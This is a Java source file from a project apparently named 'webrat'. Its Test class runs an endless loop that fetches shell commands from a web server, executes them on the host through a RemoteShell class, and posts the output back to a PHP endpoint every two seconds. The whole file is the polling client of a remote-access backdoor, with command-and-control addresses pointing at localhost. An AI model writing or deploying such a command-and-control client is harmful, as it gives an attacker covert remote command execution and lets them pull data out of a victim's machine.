package com.renks.webrat;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Test {

	public static void main(String[] args)  {
		
		
		RemoteShell rs = new RemoteShell("http://localhost:80/WebServer%20based%20shell%20using%20JAVA/command_to_execute.txt", "http://localhost:80/WebServer%20based%20shell%20using%20JAVA/output_write_to_file.php");
		boolean isCommand = false;
		while(true) {
			
			rs.fetchCommand();
			if(rs.getCommand().equals("echo ERROR_NULL_COMMAND")) {
				isCommand = false;
			}else {
				isCommand = true;
			}
			
			if(isCommand) {
				rs.executeCommand();
				rs.setArguments("msg", rs.getCommandOutput());
				new BufferedReader(new InputStreamReader(rs.sendOutputToServer())).lines().forEach(System.out::println);
			}
			
			// Sleep for 2 seconds
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
			}
		}
	}

}
